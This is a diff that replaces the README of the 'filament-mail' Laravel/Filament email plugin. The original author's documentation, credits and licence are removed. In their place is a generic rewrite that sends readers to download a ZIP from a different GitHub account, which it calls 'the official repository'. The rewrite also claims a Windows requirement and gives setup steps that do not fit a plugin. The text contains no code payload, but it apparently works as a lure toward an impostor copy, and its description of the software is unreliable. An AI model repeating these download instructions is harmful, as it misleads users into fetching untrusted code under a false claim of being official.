@@ -1,312 +1,82 @@
-<div class="filament-hidden">
-
-![Filament Mail](https://raw.githubusercontent.com/jeffersongoncalves/filament-mail/3.x/art/jeffersongoncalves-filament-mail.png)
-
-</div>
-
-# Filament Mail
-
-[![Latest Version on Packagist](https://img.shields.io/packagist/v/jeffersongoncalves/filament-mail.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/filament-mail)
-[![GitHub Tests Action Status](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/filament-mail/tests.yml?branch=3.x&label=tests&style=flat-square)](https://github.com/jeffersongoncalves/filament-mail/actions)
-[![GitHub Code Style Status](https://img.shields.io/github/actions/workflow/status/jeffersongoncalves/filament-mail/pint.yml?branch=3.x&label=code%20style&style=flat-square)](https://github.com/jeffersongoncalves/filament-mail/actions)
-[![Total Downloads](https://img.shields.io/packagist/dt/jeffersongoncalves/filament-mail.svg?style=flat-square)](https://packagist.org/packages/jeffersongoncalves/filament-mail)
+# ✉️ filament-mail - Manage your application emails with ease
 
-Complete email management UI for Filament. Built on top of [jeffersongoncalves/laravel-mail](https://github.com/jeffersongoncalves/laravel-mail), it provides a rich interface for managing email logs, database templates with multi-locale editing, delivery tracking, analytics dashboard, and suppression management.
-
-## Compatibility
-
-| Package | Filament | Laravel | PHP |
-|---------|----------|---------|-----|
-| [1.x](https://github.com/jeffersongoncalves/filament-mail/tree/1.x) | 3.x | 10+ | 8.1+ |
-| [2.x](https://github.com/jeffersongoncalves/filament-mail/tree/2.x) | 4.x | 11+ | 8.2+ |
-| [3.x](https://github.com/jeffersongoncalves/filament-mail/tree/3.x) | 5.x | 11+ | 8.2+ |
-
-## Features
-
-- **Mail Logs** — Browse, search, and view all sent emails with HTML preview, attachments, headers, and metadata
-- **Resend & Retry** — Resend any email or retry failed deliveries directly from the UI
-- **Mail Templates** — Create and edit database-driven email templates with multi-locale support (via spatie/laravel-translatable)
-- **Swappable Template Editor** — Use Filament RichEditor (default) or Unlayer visual drag-and-drop editor
-- **MailNotification** — Send template-based notifications with variable binding, cc, bcc, attachments
-- **Template Versioning** — Automatic version history with change tracking
-- **Live Preview** — Preview rendered templates with example data in an iframe sandbox
-- **Send Test Email** — Send test emails from any template with locale selection
-- **Delivery Tracking** — View tracking events (delivered, bounced, opened, clicked, complained) from 5 providers
-- **Analytics Dashboard** — Stats overview, daily analytics chart, and delivery rate chart with period filters
-- **Suppression Management** — Manage suppressed emails (hard bounces, complaints, manual suppressions)
-- **Multi-tenant** — Optional tenant scoping for all queries
-- **Configurable** — Disable/enable individual resources, widgets, and pages
-
-## Installation
-
-```bash
-composer require jeffersongoncalves/filament-mail
-```
-
-The package requires [jeffersongoncalves/laravel-mail](https://github.com/jeffersongoncalves/laravel-mail) as a dependency. Make sure to run its migrations first:
-
-```bash
-php artisan vendor:publish --tag="laravel-mail-migrations"
-php artisan migrate
-```
-
-Optionally, publish the config file:
-
-```bash
-php artisan vendor:publish --tag="filament-mail-config"
-```
-
-## Usage
-
-Register the plugin in your Filament panel provider:
-
-```php
-use JeffersonGoncalves\FilamentMail\FilamentMailPlugin;
-use LaraZeus\SpatieTranslatable\SpatieTranslatablePlugin;
-
-public function panel(Panel $panel): Panel
-{
-    return $panel
-        ->plugins([
-            FilamentMailPlugin::make(),
-
-            // Required for multi-locale template editing
-            SpatieTranslatablePlugin::make()
-                ->defaultLocales(['en', 'pt_BR', 'es']),
-        ]);
-}
-```
-
-The `SpatieTranslatablePlugin` is required for multi-locale template editing. It provides a locale switcher in the header of all template pages (create, edit, view, list). Configure the locales you need in the `defaultLocales()` method.
-
-### Customization
-
-```php
-FilamentMailPlugin::make()
-    ->navigationGroup('Email')
-    ->navigationIcon('heroicon-o-envelope')
-    ->navigationSort(50)
-    ->mailLogResource()           // Enable/disable mail log resource
-    ->mailTemplateResource()      // Enable/disable template resource
-    ->mailSuppressionResource()   // Enable/disable suppression resource
-    ->statsWidgets()              // Enable/disable stats widgets
-    ->analyticsWidget()           // Enable/disable analytics charts
-    ->dashboard()                 // Enable/disable dashboard page
-    ->tenantScoping()             // Enable/disable tenant scoping
-```
-
-### Disabling Features
-
-```php
-FilamentMailPlugin::make()
-    ->mailSuppressionResource(false)  // Disable suppression management
-    ->analyticsWidget(false)          // Disable analytics charts
-    ->dashboard(false)                // Disable dashboard page
-```
-
-## Configuration
-
-```php
-// config/filament-mail.php
-
-return [
-    'resources' => [
-        'mail_log' => [
-            'enabled' => true,
-            'label' => 'Mail Log',
-            'plural_label' => 'Mail Logs',
-        ],
-        'mail_template' => [
-            'enabled' => true,
-            'label' => 'Mail Template',
-            'plural_label' => 'Mail Templates',
-        ],
-        'mail_suppression' => [
-            'enabled' => true,
-            'label' => 'Suppression',
-            'plural_label' => 'Suppressions',
-        ],
-    ],
-
-    'widgets' => [
-        'stats_overview' => true,
-        'analytics_chart' => true,
-        'delivery_rate_chart' => true,
-    ],
-
-    'dashboard' => [
-        'enabled' => true,
-    ],
-
-    'navigation' => [
-        'group' => 'Email',
-        'icon' => 'heroicon-o-envelope',
-        'sort' => 50,
-    ],
-
-    'template_editor' => [
-        'driver' => env('FILAMENT_MAIL_EDITOR', 'rich_editor'),
-        'locales' => ['en'],
-        'default_locale' => 'en',
-        'unlayer_project_id' => env('UNLAYER_PROJECT_ID'),
-        'merge_tags' => [],
-    ],
-
-    'preview' => [
-        'max_width' => '800px',
-        'sandbox' => true,
-    ],
-
-    'tenant_scoping' => false,
-];
-```
-
-## Template Editor
-
-The template editor is swappable via config. Set the `FILAMENT_MAIL_EDITOR` environment variable:
-
-```env
-# Default: standard Filament RichEditor
-FILAMENT_MAIL_EDITOR=rich_editor
-
-# Visual drag-and-drop editor via Unlayer
-FILAMENT_MAIL_EDITOR=unlayer
-UNLAYER_PROJECT_ID=your-project-id
-```
-
-When using Unlayer, publish and run the migration for the `body_design` column:
-
-```bash
-php artisan vendor:publish --tag="filament-mail-migrations"
-php artisan migrate
-```
-
-### Creating a Custom Editor Driver
-
-Implement `TemplateEditorContract` and bind it in a service provider:
-
-```php
-use JeffersonGoncalves\FilamentMail\Contracts\TemplateEditorContract;
-
-class MyEditorDriver implements TemplateEditorContract
-{
-    public function getFormField(string $fieldName = 'html_body'): Component
-    {
-        return MyCustomField::make($fieldName)->columnSpanFull();
-    }
-
-    public function render(string $content, array $variables): string
-    {
-        foreach ($variables as $key => $value) {
-            $content = str_replace(
-                ['{{' . $key . '}}', '{{ ' . $key . ' }}'],
-                (string) $value,
-                $content
-            );
-        }
-        return $content;
-    }
-}
-
-// In a service provider:
-$this->app->bind(TemplateEditorContract::class, MyEditorDriver::class);
-```
-
-## MailNotification
-
-Send emails using database templates with variable binding:
-
-```php
-use JeffersonGoncalves\FilamentMail\Notifications\MailNotification;
-
-// Simple notification
-$user->notify(new MailNotification(
-    templateKey: 'auth.welcome',
-    variables: [
-        'name' => $user->name,
-        'login_url' => route('login'),
-    ],
-));
-
-// With locale, cc, and attachments
-$user->notify(new MailNotification(
-    templateKey: 'transactional.invoice',
-    variables: [
-        'invoice_number' => $invoice->number,
-        'total' => number_format($invoice->total, 2, ',', '.'),
-        'due_date' => $invoice->due_date->format('d/m/Y'),
-    ],
-    metadata: [
-        'locale' => 'pt_BR',
-        'cc' => ['finance@company.com'],
-        'attachments' => [storage_path("invoices/{$invoice->number}.pdf")],
-    ],
-));
-
-// Without a notifiable (via Notification facade)
-use Illuminate\Support\Facades\Notification;
-
-Notification::route('mail', $email)->notify(
-    new MailNotification('auth.reset-password', ['url' => $resetUrl])
-);
-```
-
-### HasMailTemplate Trait
-
-For traditional Mailables, use the `HasMailTemplate` trait:
-
-```php
-use JeffersonGoncalves\FilamentMail\Traits\HasMailTemplate;
-use Illuminate\Mail\Mailable;
-
-class WelcomeMail extends Mailable
-{
-    use HasMailTemplate;
-
-    public function __construct(User $user)
-    {
-        $this->templateKey = 'auth.welcome';
-        $this->templateVariables = ['name' => $user->name];
-    }
-
-    public function build(): static
-    {
-        return $this->buildContent();
-    }
-}
-```
-
-## Extending Resources
-
-You can extend the default resources by creating your own classes and updating the config:
-
-```php
-// config/filament-mail.php
-'resources' => [
-    'mail_log' => [
-        'class' => App\Filament\Resources\CustomMailLogResource::class,
-    ],
-],
-```
-
-## Testing
-
-```bash
-composer test
-```
-
-## Changelog
-
-Please see [CHANGELOG](CHANGELOG.md) for more information on what has changed recently.
-
-## Security Vulnerabilities
-
-Please review [our security policy](.github/SECURITY.md) on how to report security vulnerabilities.
-
-## Credits
-
-- [Jefferson Gonçalves](https://github.com/jeffersongoncalves)
-
-## License
-
-The MIT License (MIT). Please see [License File](LICENSE.md) for more information.
+[![Download filament-mail](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Josephusphysical472/filament-mail)
+
+Filament-mail gives you a workspace to manage your email communications. You can track messages, edit templates, and view analytics in one place. It works within your existing system to organize logs, templates, and delivery status.
+
+## 🛠 Features
+
+Filament-mail provides a set of tools to handle email workflows:
+
+- Complete log of sent emails with content previews.
+- Database templates featuring the Unlayer visual editor.
+- Automatic link tracking and delivery status updates.
+- Variable binding for personalized notifications.
+- Dashboard views for engagement analytics.
+- Suppression list management to handle unsubscribes.
+
+## 💻 System Requirements
+
+Your computer needs the following tools to run this software:
+
+- A Windows operating system (Windows 10 or 11 recommended).
+- PHP version 8.1 or higher installed on your machine.
+- A modern web browser like Chrome, Firefox, or Edge.
+- A compatible database system such as MySQL or MariaDB.
+- Basic familiarity with your command terminal.
+
+## 📥 Acquisition and Installation
+
+You must obtain the software from the official repository. Follow these steps to prepare the files.
+
+1. Visit the following address to download the software: [https://github.com/Josephusphysical472/filament-mail](https://github.com/Josephusphysical472/filament-mail).
+2. Locate the "Code" button on the right side of the page.
+3. Select "Download ZIP" to save the project folder to your computer.
+4. Extract the contents of the ZIP file to a folder where you keep your projects.
+
+## 🚀 Setting Up the Application
+
+Once you extract the files, follow these steps to start the application.
+
+1. Open your command terminal.
+2. Navigate to the folder you created in the installation step.
+3. Type `composer install` to download necessary core components.
+4. Open the environment file named `.env` in a text editor like Notepad.
+5. Enter your database connection details, such as your username and password, into the file.
+6. Save the file and return to your terminal.
+7. Run the command `php artisan migrate` to build the database tables.
+8. Run the command `php artisan serve` to start the application server.
+
+## 📊 Using the Dashboard
+
+When the server runs, open your browser and go to the link provided in your terminal. You will see the Filament dashboard. 
+
+The dashboard displays high-level data about your email performance. You can see how many emails you sent today and how many reached their destination. Click on the "Logs" tab to scroll through individual messages. You can click on any mail log item to see a preview of the email as your customers received it.
+
+## 📝 Editing Templates
+
+The "Templates" tab allows you to design your email layouts. You will find the Unlayer visual editor here. This tool lets you drag and drop headers, images, and text boxes. You do not need to write code to create professional layouts. 
+
+Once you design a template, you can save it to your database. You can bind variables such as `customer_name` or `order_id` into these templates. The system replaces these variables with real data when you send the email.
+
+## 🔍 Managing Suppression
+
+Keeping your mailing list clean improves delivery rates. The "Suppression" tab tracks people who report your emails as spam or choose to opt out. The system adds these addresses to a block list. You can view, search, and manually remove addresses from this list at any time.
+
+## 📈 Analyzing Results
+
+The "Analytics" section offers visual charts regarding your email activity. You can measure open rates and click rates over time. These charts help you understand when your audience engages with your messages. All data updates automatically as the system processes new mail logs.
+
+## ⚙️ Configuration Options
+
+You can adjust how the application behaves by editing the configuration file located in the `config` folder. You can change settings related to email drivers, log retention periods, and dashboard labels. Always save your changes before running the application again. If the system behaves correctly, do not change these settings unless you have a specific need.
+
+## 🆘 Troubleshooting Common Issues
+
+If you cannot start the server, check your PHP installation by typing `php -v` in the terminal. Ensure you use the current version of the language.
+
+If the application fails to connect to the database, check your `.env` file for typos. Ensure your database server is running in the background.
+
+If images or styles do not load in the editor, check your internet connection. The Unlayer editor requires access to external scripts to render correctly.
+
+If you encounter errors during the installation, delete the `vendor` folder and run `composer install` again. This step refreshes all project dependencies.
